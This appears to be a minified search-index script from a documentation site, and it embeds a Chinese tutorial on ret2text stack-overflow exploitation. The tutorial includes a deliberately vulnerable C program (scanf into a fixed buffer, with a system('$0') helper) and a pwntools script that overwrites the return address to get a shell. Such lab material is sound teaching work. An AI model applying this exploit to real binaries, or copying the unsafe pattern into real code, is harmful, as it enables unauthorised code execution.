var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(e){const s=suggestions.classList.contains("d-none");if(s)return;const t=[...suggestions.querySelectorAll("a")];if(t.length===0)return;const n=t.indexOf(document.activeElement);if(e.key==="ArrowUp"){e.preventDefault();const s=n>0?n-1:0;t[s].focus()}else if(e.key==="ArrowDown"){e.preventDefault();const s=n+1<t.length?n+1:n;t[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/exploit/stackoverflow/ret2text/",title:"ret2text",description:`0x01 介绍 # 栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 栈帧 ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：
函数的参数，一般有父函数压入栈中 函数的返回地址，即函数执行完后ret跳转的地址 帧指针，即上一个栈帧的位置 局部变量，即函数内部声明的变量 栈有三大很重要的作用，同时也体现在栈帧结构里面了：
保存函数的局部变量 函数调用时传递参数 保存函数返回后的地址 而我们所有的栈溢出基本都是围绕着三大作用在进行，包括这里的ret2text题型。这种题型比较简单，它主要利用的是第三大功能，即函数返回地址，我们可以来看一个简单的程序的汇编代码
void main() { int a = 1; int b = 2; } // gcc -m32 test.c -o test -fno-pic -fno-stack-protector -no-pie 生成的汇编代码为
080483db \u0026lt;main\u0026gt;: 80483db: 55 push ebp 80483dc: 89 e5 mov ebp,esp 80483de: 83 ec 10 sub esp,0x10 80483e1: c7 45 fc 01 00 00 00 mov DWORD PTR [ebp-0x4],0x1 80483e8: c7 45 f8 02 00 00 00 mov DWORD PTR [ebp-0x8],0x2 80483ef: 90 nop 80483f0: c9 leave 80483f1: c3 ret 主要关注函数序言和函数尾声，在进入main函数之前，已经由父函数将main函数的返回地址给压入栈中，接着通过函数序言将帧指针压入栈中，并将帧指针的地址赋值给ebp，经过函数体后则进入函数尾声，尾声主要依靠 leave 指令，该指令相当于 mov esp, ebp;pop ebp ，当执行完该指令后当前栈顶就变为了main函数的返回地址，而 ret 指令的作用是跳转到当前栈顶存储的地址处继续执行（即修改eip为当前栈顶存储的那个值），这里也就是main函数的返回地址。`,content:`0x01 介绍 # 栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 栈帧 ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：
函数的参数，一般有父函数压入栈中 函数的返回地址，即函数执行完后ret跳转的地址 帧指针，即上一个栈帧的位置 局部变量，即函数内部声明的变量 栈有三大很重要的作用，同时也体现在栈帧结构里面了：
保存函数的局部变量 函数调用时传递参数 保存函数返回后的地址 而我们所有的栈溢出基本都是围绕着三大作用在进行，包括这里的ret2text题型。这种题型比较简单，它主要利用的是第三大功能，即函数返回地址，我们可以来看一个简单的程序的汇编代码
void main() { int a = 1; int b = 2; } // gcc -m32 test.c -o test -fno-pic -fno-stack-protector -no-pie 生成的汇编代码为
080483db \u0026lt;main\u0026gt;: 80483db: 55 push ebp 80483dc: 89 e5 mov ebp,esp 80483de: 83 ec 10 sub esp,0x10 80483e1: c7 45 fc 01 00 00 00 mov DWORD PTR [ebp-0x4],0x1 80483e8: c7 45 f8 02 00 00 00 mov DWORD PTR [ebp-0x8],0x2 80483ef: 90 nop 80483f0: c9 leave 80483f1: c3 ret 主要关注函数序言和函数尾声，在进入main函数之前，已经由父函数将main函数的返回地址给压入栈中，接着通过函数序言将帧指针压入栈中，并将帧指针的地址赋值给ebp，经过函数体后则进入函数尾声，尾声主要依靠 leave 指令，该指令相当于 mov esp, ebp;pop ebp ，当执行完该指令后当前栈顶就变为了main函数的返回地址，而 ret 指令的作用是跳转到当前栈顶存储的地址处继续执行（即修改eip为当前栈顶存储的那个值），这里也就是main函数的返回地址。
而ret2text顾名思义，就是控制 ret 指令跳转的地址（即函数返回地址）为程序里现有的 text 段代码，以达到RCE的过程。至于如何将函数返回地址给修改就需要设计到核心理念 溢出 ，超过容器本身大小的操作就叫溢出。对于C语言来说，每个变量的大小都是固定的（堆以外），学过的都知道C语言不允许动态设置数组的大小，只能是固定值，例如 char a[i] 就是错误的。这时候C语言里有些函数就会变得非常危险，这些危险函数更像是面对人而言并非对程序，比如 gets 函数，它是一个输入函数，可以将你输入的内容存进数组当中，并且只有当人输入 \\n 回车的时候才会截断输入，这样的截断对人来说是合理的，但是对于数组来说一点都不合理，对于数组来说应该是不大于数组大小的输入都是合理的，当你的输入超过数组大小则应该截断。可以 gets 函数并没有这么智能，也就是我们可以对该数组进行溢出的操作。
常见的危险函数有：
gets 函数，遇到 \\n 截断，不保留 \\n 字符串后面添加 \\x00 fgets 函数，遇到 \\n 截断，保留 \\n 并添加 \\x00 scanf 函数 %s 格式化字符串输入，遇到 \\x09 、 \\x0a 、 \\x0b 、 \\x0c 、 \\x0d 、 \\x20 截断，不保留截断字符最后添加 \\x00 sscanf 函数，和 scanf 差不多，多了个 \\x00 截断 str类函数（ strcpy 、 strcat 等）遇到 \\x00 截断，保留 \\x00 read 函数，无截断字符，不添加字符 我们之前说过如果你在函数内部声明一个变量，那么这个就是一个局部变量，存储在栈中，而局部变量邻近的位置并不是空，而是一些其他数据，这时候如果我们通过危险函数对这个局部变量进行溢出，那么我们将可以修改其他数据的内容，只要这个溢出的字节数够多，那么我们就可以修改函数返回地址。
而现有的 text 段代码的话通常会是 system(\u0026quot;/bin/sh\u0026quot;) 、 system(\u0026quot;$0\u0026quot;) 、 execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) 这种直接获取shell进程的函数调用
以一个简单的程序来讲具体实现
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void hint() { system(\u0026quot;$0\u0026quot;); } int main() { char buf[0x10]; printf(\u0026quot;input: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, buf); return 0; } // gcc ret2text.c -o ret2text -no-pie -fno-stack-protector 做ret2text记住三大步骤：
找溢出点 计算局部变量到函数返回地址的偏移量 找getshell代码片段地址 根据危险函数列表很容易就可以找到溢出点，即scanf输入处
其次计算偏移量，用IDA有个便捷的方法来计算偏移量，双击上图中的输入变量即v4，可以看到下图
这里 var_10 即变量， s 即帧指针，而 r 则是函数返回地址，左侧的地址是相对偏移地址，右侧是每个数据占据的字节大小，可以很容易计算出变量到函数返回地址之间有16+8=24字节的偏移量
最后找getshell代码片段
你可以直接用hint函数地址，也可以只用从给system函数传递参数处的指令开始，两者结果是一样的
最后我们就可以编写攻击脚本了
from pwn import* # 引入pwntools包 o = process(\u0026quot;./ret2text\u0026quot;) # 执行ret2text程序并获取其I/O接口 payload = b'a'*24 # 填充变量与函数返回地址的空隙 payload += p64(0x4005d6) # 0x4005d6是getshell代码片段地址，p64的作用是将地址打包成小端序填入栈单元 o.sendline(payload) # 发送payload，会在结尾加 '\\n' o.interactive() # 进入交互模式 `}),e.add({id:1,href:"/docs/exploit/stackoverflow/ret2syscall/",title:"Ret2syscall",description:"0x01 介绍 # ",content:"0x01 介绍 # "}),e.add({id:2,href:"/docs/exploit/",title:"Exploit",description:"",content:""}),e.add({id:3,href:"/docs/exploit/stackoverflow/",title:"Stackoverflow",description:"",content:""}),e.add({id:4,href:"/docs/",title:"Docs",description:"Docs Doks.",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()